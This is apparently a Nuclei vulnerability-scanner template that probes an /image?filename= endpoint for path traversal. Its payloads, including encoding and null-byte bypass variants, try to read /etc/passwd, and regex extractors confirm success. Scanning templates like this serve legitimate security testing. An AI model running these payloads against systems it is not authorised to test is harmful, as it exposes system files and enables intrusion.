id: Path-Traversal-HTTP2-HTTP11

info:
  name: Path Traversal (HTTP/2 - HTTP/1.1)
  author: chitowebster
  severity: medium
  description: Vulnerabilidad Path traversal cheackeando una petici√≥n HTTP/2 primero, luego HTTP/1.1
  reference:
  tags: path-traversal

http:
  # Primera solicitud: HTTP/2
  - raw:
      - |+
        GET /image?filename={{param}} HTTP/2
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        
    attack: batteringram
    payloads:
      param:
        - ../../../../../../etc/passwd
        - /etc/passwd
        - ....//....//....//etc/passwd
        - ..%252f..%252f..%252fetc/passwd
        - /var/www/images/../../../etc/passwd
        - ../../../etc/passwd%00.png

    extractors:
      - type: regex
        part: body
        regex:
          - "root:x:0:0"
          - "daemon:x:1:1"
          - "bin:x:2:2"
          - "sys:x:3:3"
          - "sync:x:4:65534"
          - "games:x:5:60"
          - "man:x:6:12"
          - "lp:x:7:7"
          - "mail:x:8:8"
